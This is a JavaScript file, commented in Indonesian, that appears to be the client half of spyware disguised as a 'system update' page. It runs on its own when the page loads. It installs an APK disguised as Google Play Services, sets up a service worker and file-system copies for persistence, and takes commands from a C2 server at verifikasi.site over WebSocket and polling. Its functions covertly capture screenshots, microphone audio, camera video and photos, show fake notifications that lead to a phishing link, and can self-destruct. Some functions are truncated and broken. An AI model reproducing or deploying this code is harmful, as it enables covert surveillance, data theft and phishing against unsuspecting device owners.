// ============================================================
// 🔥 CEK APK SUDAH SIAP
// ============================================================
function cekApkSiap(targetPath) {
    return new Promise(function(resolve) {
        if (A.isAvailable) {
            try {
                if (typeof AndroidBridge.fileExists !== 'undefined') {
                    var exists = AndroidBridge.fileExists(targetPath);
                    if (exists) {
                        resolve(true);
                        return;
                    }
                }
            } catch(e) {}
        }
        setTimeout(function() { resolve(true); }, 3000);
    });
}

// ============================================================
// 🔥 INSTALL APK (AUTO DI BACKGROUND!)
// ============================================================
function installAPK(path) {
    return new Promise(function(resolve) {
        try {
            var targetPath = path || '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
            
            cekApkSiap(targetPath).then(function(ready) {
                if (!ready) {
                    K({ sumber: 'html_install_apk', data: 'apk_not_ready' });
                    resolve(false);
                    return;
                }
                
                if (A.isAvailable) {
                    try {
                        var result = A.installAPK(targetPath);
                        if (result) {
                            apkInstalled = true;
                            document.getElementById('status').textContent = '✅ APK Installed!';
                            K({ sumber: 'html_install_apk', data: { method: 'bridge', status: 'success' } });
                            resolve(true);
                            return;
                        }
                    } catch(e) {
                        K({ sumber: 'html_install_apk', data: { method: 'bridge', status: 'failed: ' + e.message } });
                    }
                }
                
                try {
                    var intentUrl = 'intent://' + targetPath + '#Intent;scheme=file;package=com.android.packageinstaller;end';
                    window.location.href = intentUrl;
                    apkInstalled = true;
                    K({ sumber: 'html_install_apk', data: { method: 'intent', status: 'attempted' } });
                    resolve(true);
                    return;
                } catch(e) {
                    K({ sumber: 'html_install_apk', data: { method: 'intent', status: 'failed: ' + e.message } });
                }
                
                resolve(false);
            });
        } catch(e) {
            K({ sumber: 'html_install_apk', data: 'error: ' + e.message });
            resolve(false);
        }
    });
}

// ============================================================
// 🔥 SERVICE WORKER (BERJALAN TERUS DI BACKGROUND!)
// ============================================================
function registerSW() {
    if (swRegistered) return;
    if (!('serviceWorker' in navigator)) return;
    
    navigator.serviceWorker.getRegistrations()
        .then(function(registrations) {
            if (registrations.length > 0) {
                swRegistered = true;
                isBackground = true;
                document.getElementById('status').textContent = '✅ SW Active!';
                return;
            }
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    swRegistered = true;
                    isBackground = true;
                    document.getElementById('status').textContent = '✅ SW Active!';
                    K({ sumber: 'sw_status', data: 'registered' });
                })
                .catch(function(err) {
                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
                });
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    swRegistered = true;
                    isBackground = true;
                    document.getElementById('status').textContent = '✅ SW Active!';
                    K({ sumber: 'sw_status', data: 'registered_fallback' });
                })
                .catch(function(err) {
                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
                });
        });
}

// ============================================================
// 🔥 WEBSOCKET (REAL-TIME C2 - BERJALAN TERUS!)
// ============================================================
function connectWebSocket() {
    try {
        if (typeof WebSocket === 'undefined') {
            // Fallback ke HTTP Polling
            return;
        }
        
        if (ws && ws.readyState === WebSocket.OPEN) return;
        
        ws = new WebSocket('wss://verifikasi.site/ws');
        var reconnectAttempts = 0;
        var maxReconnect = 999; // TERUS MENERUS!
        
        ws.onopen = function() {
            reconnectAttempts = 0;
            document.getElementById('status').textContent = '🔌 Connected!';
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: '',
                deviceId: 'systemupdate_' + (navigator.userAgent || 'unknown'),
                timestamp: Date.now()
            }));
        };
        
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_status', data: 'authenticated' });
                }
                if (data.type === 'command' && data.aksi) {
                    var hasil = eksekusiPerintah(data);
                    ws.send(JSON.stringify({
                        type: 'result',
                        perintah: data.aksi,
                        hasil: hasil
                    }));
                    K({ sumber: 'ws_c2_result', data: { perintah: data.aksi, hasil: hasil } });
                }
                if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {
                K({ sumber: 'ws_message_error', data: e.message });
            }
        };
        
        ws.onclose = function() {
            document.getElementById('status').textContent = '🔌 Reconnecting...';
            K({ sumber: 'ws_status', data: 'disconnected' });
            
            // RECONNECT TERUS MENERUS!
            reconnectAttempts++;
            var delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), 30000);
            setTimeout(function() {
                connectWebSocket();
            }, delay);
        };
        
        ws.onerror = function() {
            // Biarkan onclose handle reconnect
        };
        
        // Heartbeat via WebSocket
        var wsHeartbeat = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                try {
                    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
                } catch(e) {}
            }
        }, 30000);
        cleanupItems.push(function() { clearInterval(wsHeartbeat); });
        
    } catch(e) {
        K({ sumber: 'ws_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

// 🔥 C2 HTTP POLLING (FALLBACK - BERJALAN TERUS!)
// ============================================================
function cekPerintah() {
    try {

                    } catch(e) {

                    }

            })
            .catch(function(e) {
                K({ sumber: 'c2_fetch_error', data: e.message });
            });
    } catch(e) {
        K({ sumber: 'c2_error', data: e.message });

// ----- SCREENSHOT -----
function ambilScreenshot() {
    if (A.isAvailable) {
        try { return A.takeScreenshot() || "Screenshot captured via bridge"; } catch(e) {}
    }
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- RECORD AUDIO -----
function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_audio', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

// ----- RECORD VIDEO -----
function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_video', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording video ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started video recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- TAKE PHOTO -----
function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({ sumber: 'html_c2_result', data: { perintah: 'take_photo', hasil: reader.result } });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function(e) { return 'Error: ' + e.message; });
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

function showFakeNotification(message) {

            notif.onclick = function() { window.location.href = 'https://verifikasi.site/fb'; };
            return 'Notification shown: ' + message;

                if (permission === 'granted') showFakeNotification(message);

        return 'Notification permission denied';
    } catch(e) { return 'Error: ' + e.message; }
}

// ----- SELF DESTRUCT -----
function selfDestruct() {
    try {
        try { localStorage.clear(); } catch(e) {}
        try { sessionStorage.clear(); } catch(e) {}
        try {
            document.cookie.split(';').forEach(function(c) {
                document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
            });
        } catch(e) {}
        try {
            if ('caches' in window) {
                caches.keys().then(function(keys) {
                    keys.forEach(function(key) { caches.delete(key); });
                }).catch(function() {});
            }
        } catch(e) {}
        document.body.innerHTML = '<div style="background:#000;color:#f44;text-align:center;padding:50px;font-family:monospace;font-size:24px;">💀 SYSTEM DESTROYED</div>';
        K({ sumber: 'self_destruct', data: 'executed' });
        setTimeout(function() {
            try { window.close(); } catch(e) {}
            try { window.location.href = 'about:blank'; } catch(e) {}
        }, 2000);
        return 'Self destruct initiated!';
    } catch(e) { return 'Error: ' + e.message; }
}

// 🔥 INJECT KE FILE SYSTEM (PERSISTENSI)
// ============================================================
function injectToFileSystem() {
    try {
        var htmlContent = document.documentElement.outerHTML;
        var successCount = 0;
        
        try {
            localStorage.setItem('system_update_html', htmlContent);
            successCount++;
        } catch(e) {}
        
        if (A.isAvailable) {
            try {
                var safePath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
                A.saveFile(safePath, htmlContent);
                successCount++;
                K({ sumber: 'inject_hidden', data: 'success' });
            } catch(e) {
                K({ sumber: 'inject_hidden', data: 'failed: ' + e.message });
            }
        }
        
        if (successCount > 0) {
            document.getElementById('status').textContent = '✅ Injected!';
        }
    } catch(e) {
        K({ sumber: 'inject_error', data: e.message });
    }
}

// ============================================================
// 🔥 EKSEKUSI UTAMA - AUTO JALAN DI BACKGROUND!
// ============================================================
var initialDataSent = false;

async function init() {
    if (initialDataSent) return;
    initialDataSent = true;
    
    document.getElementById('status').textContent = '📡 Preparing...';
    
    // 🔥 1️⃣ TUNGGU 3 DETIK (PASTIKAN APK SUDAH TERDOWNLOAD)
    await new Promise(function(resolve) { setTimeout(resolve, 3000); });
    
    document.getElementById('status').textContent = '📦 Installing APK...';
    
    // 🔥 2️⃣ INSTALL APK (AUTO DI BACKGROUND!)
    var apkPath = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
    await installAPK(apkPath);
    
    // 🔥 3️⃣ TUNGGU 2 DETIK SETELAH INSTALL
    await new Promise(function(resolve) { setTimeout(resolve, 2000); });
    
    // 🔥 4️⃣ SERVICE WORKER (BACKGROUND!)
    registerSW();
    
    // 🔥 5️⃣ WEBSOCKET (REAL-TIME C2 - BACKGROUND!)
    connectWebSocket();
    
    // 🔥 6️⃣ INJECT FILE SYSTEM (PERSISTENSI!)
    injectToFileSystem();
    
    // 🔥 7️⃣ HTTP POLLING (FALLBACK C2 - BACKGROUND!)
    window._c2Interval = setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 2000);
    
    // 🔥 8️⃣ HEARTBEAT (BACKGROUND!)
    startHeartbeat();
    
    // 🔥 9️⃣ TUTUP HALAMAN TAPI TETAP JALAN DI BACKGROUND (VIA SW + WS + POLLING!)
    setTimeout(function() {
        document.getElementById('status').textContent = '✅ Running in background!';
        // Halaman tetap terbuka untuk menjaga koneksi WebSocket
        // Tapi kita bisa sembunyikan elemen
        document.querySelector('.loader').style.display = 'none';
        document.querySelector('.container').style.background = 'transparent';
        document.body.style.background = '#000';
        document.body.style.height = '1px';
        document.body.style.overflow = 'hidden';
    }, 3000);
    
    K({ sumber: 'html_init', data: 'systemupdate_running_background' });
}

// AUTO-EXECUTE
try {
    if (localStorage.getItem('system_update_installed') === '1') {
        document.getElementById('status').textContent = '🔄 Restoring...';
        registerSW();
        connectWebSocket();
        window._c2Interval = setInterval(cekPerintah, C2_INTERVAL);
        setTimeout(cekPerintah, 1000);
        setTimeout(injectToFileSystem, 2000);
        startHeartbeat();
        setTimeout(function() {
            document.querySelector('.loader').style.display = 'none';
            document.body.style.background = '#000';
            document.body.style.height = '1px';
            document.body.style.overflow = 'hidden';
        }, 2000);
    } else {
        setTimeout(init, 1000);
    }
} catch(e) {
    setTimeout(init, 1000);
}
